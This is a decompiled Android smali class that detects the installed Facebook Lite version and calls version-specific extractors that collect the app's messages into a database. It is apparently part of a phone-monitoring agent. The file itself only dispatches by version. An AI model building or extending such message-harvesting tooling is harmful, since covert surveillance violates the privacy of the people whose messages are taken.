.class public Lcom/hp/vd/module/monitor/facebooklite/FacebookMessageExtractor;
.super Ljava/lang/Object;
.source "FacebookMessageExtractor.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field protected static final TAG:Ljava/lang/String; = "FbMsgLiteExtractor"


# instance fields
.field protected context:Lcom/hp/vd/context/Context;

.field protected facebookMessageDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/FacebookMessageLiteData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>(Lcom/hp/vd/context/Context;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/hp/vd/context/Context;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/FacebookMessageLiteData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 25
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 19
    iput-object v0, p0, Lcom/hp/vd/module/monitor/facebooklite/FacebookMessageExtractor;->context:Lcom/hp/vd/context/Context;

    .line 20
    iput-object v0, p0, Lcom/hp/vd/module/monitor/facebooklite/FacebookMessageExtractor;->facebookMessageDao:Lcom/j256/ormlite/dao/Dao;

    .line 21
    iput-object v0, p0, Lcom/hp/vd/module/monitor/facebooklite/FacebookMessageExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 22
    iput-object v0, p0, Lcom/hp/vd/module/monitor/facebooklite/FacebookMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 26
    iput-object p1, p0, Lcom/hp/vd/module/monitor/facebooklite/FacebookMessageExtractor;->context:Lcom/hp/vd/context/Context;

    .line 27
    iput-object p2, p0, Lcom/hp/vd/module/monitor/facebooklite/FacebookMessageExtractor;->facebookMessageDao:Lcom/j256/ormlite/dao/Dao;

    .line 28
    iput-object p3, p0, Lcom/hp/vd/module/monitor/facebooklite/FacebookMessageExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 29
    iput-object p4, p0, Lcom/hp/vd/module/monitor/facebooklite/FacebookMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method protected _run()V
    .locals 5

    .line 48
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/facebooklite/FacebookMessageExtractor;->detectVersion()Ljava/lang/Integer;

    move-result-object v0

    if-eqz v0, :cond_0

    .line 50
    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v1

    sget v2, Lcom/hp/vd/module/monitor/facebooklite/Version;->NAME_56_0_1_9_198:I

    if-gt v1, v2, :cond_0

    .line 52
    new-instance v0, Lcom/hp/vd/module/monitor/facebooklite/UpTo56019198/FacebookMessageExtractor;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/facebooklite/FacebookMessageExtractor;->context:Lcom/hp/vd/context/Context;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/facebooklite/FacebookMessageExtractor;->facebookMessageDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/facebooklite/FacebookMessageExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/facebooklite/FacebookMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    invoke-direct {v0, v1, v2, v3, v4}, Lcom/hp/vd/module/monitor/facebooklite/UpTo56019198/FacebookMessageExtractor;-><init>(Lcom/hp/vd/context/Context;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V

    .line 54
    invoke-virtual {v0}, Lcom/hp/vd/module/monitor/facebooklite/UpTo56019198/FacebookMessageExtractor;->run()V

    .line 55
    iget-object v0, p0, Lcom/hp/vd/module/monitor/facebooklite/FacebookMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "FbMsgLiteExtractor"

    const-string v2, "version != NULL && version <= VERSION.NAME_56_0_1_9_198 finished."

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return-void

    :cond_0
    if-eqz v0, :cond_1

    .line 60
    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    sget v1, Lcom/hp/vd/module/monitor/facebooklite/Version;->NAME_57_0_0_19_208:I

    if-lt v0, v1, :cond_1

    .line 62
    new-instance v0, Lcom/hp/vd/module/monitor/facebooklite/Above570019208/FacebookMessageExtractor;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/facebooklite/FacebookMessageExtractor;->context:Lcom/hp/vd/context/Context;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/facebooklite/FacebookMessageExtractor;->facebookMessageDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/facebooklite/FacebookMessageExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/facebooklite/FacebookMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    invoke-direct {v0, v1, v2, v3, v4}, Lcom/hp/vd/module/monitor/facebooklite/Above570019208/FacebookMessageExtractor;-><init>(Lcom/hp/vd/context/Context;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V

    .line 64
    invoke-virtual {v0}, Lcom/hp/vd/module/monitor/facebooklite/Above570019208/FacebookMessageExtractor;->run()V

    .line 65
    iget-object v0, p0, Lcom/hp/vd/module/monitor/facebooklite/FacebookMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "FbMsgLiteExtractor"

    const-string v2, "version != NULL && version >= VERSION.NAME_57_0_0_19_208 finished."

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return-void

    :cond_1
    return-void
.end method

.method protected detectVersion()Ljava/lang/Integer;
    .locals 3

    .line 74
    :try_start_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/facebooklite/FacebookMessageExtractor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    const-string v1, "com.facebook.mlite"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v0

    .line 75
    iget v0, v0, Landroid/content/pm/PackageInfo;->versionCode:I

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object v0

    :catch_0
    move-exception v0

    .line 78
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    const/4 v0, 0x0

    return-object v0
.end method

.method public run()V
    .locals 4

    .line 36
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/facebooklite/FacebookMessageExtractor;->_run()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 39
    iget-object v1, p0, Lcom/hp/vd/module/monitor/facebooklite/FacebookMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "FbMsgLiteExtractor"

    const-string v3, "Exception caught in generic extractor"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :goto_0
    return-void
.end method
